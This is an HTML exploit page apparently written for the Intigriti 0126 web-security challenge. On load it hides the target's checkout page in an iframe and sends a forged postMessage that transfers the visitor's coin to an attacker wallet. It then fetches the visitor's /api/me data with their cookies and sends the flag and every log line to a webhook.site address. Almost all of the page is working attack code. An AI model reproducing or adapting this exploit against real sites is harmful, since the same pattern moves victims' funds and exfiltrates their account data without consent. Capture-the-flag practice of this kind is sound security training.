<!DOCTYPE html>
<html>
<head>
    <title>Intigriti 0126 - Fixed Exploit</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
        h1 { color: #0f0; }
        #log { background: #111; padding: 15px; border: 1px solid #333; margin: 20px 0; font-size: 12px; max-height: 400px; overflow-y: auto; }
        .success { color: #0f0; }
        .error { color: #f00; }
        .info { color: #0ff; }
        iframe { display: none; }
    </style>
</head>
<body>
    <h1>ðŸŽ¯ Intigriti Challenge 0126 - Exploit</h1>
    <div id="log"></div>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
        const WEBHOOK = 'https://webhook.site/a9f6f6d3-2436-4a82-ab91-40cb382b5e33';

        let step = 0;
        let flagFound = false;

        function log(msg, type = 'info') {
            step++;
            const timestamp = new Date().toLocaleTimeString();
            const logDiv = document.getElementById('log');
            logDiv.innerHTML += `<div class="${type}">[${step}] ${timestamp} - ${msg}</div>`;
            console.log(`[${step}] ${msg}`);

            // Send to webhook
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                mode: 'no-cors',
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    step: step,
                    message: msg,
                    type: type
                })
            }).catch(() => {});
        }

        // Non-blocking alert using timeout
        function nonBlockingAlert(message) {
            setTimeout(() => {
                alert(message);
            }, 100);
        }

        async function exploit() {
            log('ðŸš€ EXPLOIT STARTED', 'info');

            try {
                // STEP 1: Create iframe to checkout.html (DO THIS FIRST - alert blocks!)
                log('Creating iframe to checkout.html...', 'info');
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
                document.body.appendChild(iframe);
                log('âœ… Iframe created', 'success');

                // STEP 2: Wait for iframe to load
                log('Waiting for iframe to load...', 'info');
                await new Promise(resolve => {
                    iframe.onload = resolve;
                    setTimeout(resolve, 6000); // Fallback timeout
                });
                log('âœ… Iframe loaded', 'success');

                // STEP 3: Wait for wallets to load (async operation)
                log('Waiting for wallet data to load...', 'info');
                await new Promise(r => setTimeout(r, 3000));
                log('âœ… Wallets should be loaded now', 'success');

                // STEP 4: Send malicious postMessage
                log('Sending postMessage to trigger transaction...', 'info');

                iframe.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: OUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*');

                log('âœ… postMessage sent - transaction initiated', 'success');

                // STEP 5: Trigger XSS alert (non-blocking, after transaction sent)
                log('Triggering XSS alert: alert("gigawatz")', 'info');
                nonBlockingAlert('gigawatz');
                log('âœ… XSS alert triggered (non-blocking)', 'success');

                // STEP 6: Wait for transaction to complete
                log('Waiting 5 seconds for transaction to process...', 'info');
                await new Promise(r => setTimeout(r, 5000));

                // STEP 7: Check for flag multiple times
                log('Starting flag checks...', 'info');
                await checkFlag();
                await new Promise(r => setTimeout(r, 3000));
                await checkFlag();
                await new Promise(r => setTimeout(r, 3000));
                await checkFlag();

                if (!flagFound) {
                    log('âš  Flag not found yet - transaction may still be processing', 'error');
                    log('Check webhook in 30 seconds for delayed flag', 'info');
                } else {
                    log('ðŸŽ¯ EXPLOIT COMPLETE - FLAG FOUND!', 'success');
                }

            } catch (error) {
                log('âŒ ERROR: ' + error.message, 'error');
                log('Stack: ' + error.stack, 'error');
                console.error(error);
            }
        }

        async function checkFlag() {
            log('Checking /api/me for flag...', 'info');

            try {
                const response = await fetch(TARGET + '/api/me', {
                    credentials: 'include'
                });

                const data = await response.json();

                log('API /me response: status=' + response.status + ', hasFlag=' + !!data.flag, 'info');

                if (data.flag) {
                    flagFound = true;
                    log('ðŸ†ðŸ†ðŸ† FLAG FOUND: ' + data.flag + ' ðŸ†ðŸ†ðŸ†', 'success');

                    // Send flag to webhook
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        mode: 'no-cors',
                        body: JSON.stringify({
                            timestamp: new Date().toISOString(),
                            flag: data.flag,
                            challenge: 'intigriti-0126',
                            wallet: OUR_WALLET
                        })
                    }).catch(() => {});

                    // Also alert with flag (non-blocking)
                    nonBlockingAlert('ðŸ† FLAG: ' + data.flag);

                    return true;
                } else {
                    log('No flag yet - user has ' + (data.wallets?.length || 0) + ' wallets', 'info');
                    if (data.wallets) {
                        data.wallets.forEach(w => {
                            log('  Wallet: ' + w.currency + ' - ' + w.address?.substring(0, 16) + '...', 'info');
                        });
                    }
                }

                return false;

            } catch (error) {
                log('Flag check error: ' + error.message, 'error');
                return false;
            }
        }

        // Auto-start when page loads
        window.addEventListener('load', () => {
            log('Page loaded - starting exploit...', 'info');
            setTimeout(exploit, 500);
        });
    </script>
</body>
</html>
